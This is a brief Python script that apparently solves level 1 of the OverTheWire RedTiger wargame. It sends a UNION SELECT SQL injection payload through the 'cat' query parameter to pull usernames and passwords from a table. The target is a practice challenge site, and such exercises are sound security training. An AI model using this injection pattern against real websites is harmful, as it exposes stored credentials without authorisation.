#!/usr/bin/env python3

import requests
from requests.utils import requote_uri

url = "https://redtiger.labs.overthewire.org/level1.php"

def exploit():
    
    global url
    
    payload = '1 union select 1,2,username,password from level1_users'
    target = requote_uri("%s?cat=%s" % (url, payload))
    
    r = requests.get(target)
    print(r.content.decode('utf-8'))    


def main():
    
    exploit()
    
if __name__ == '__main__':
	main()
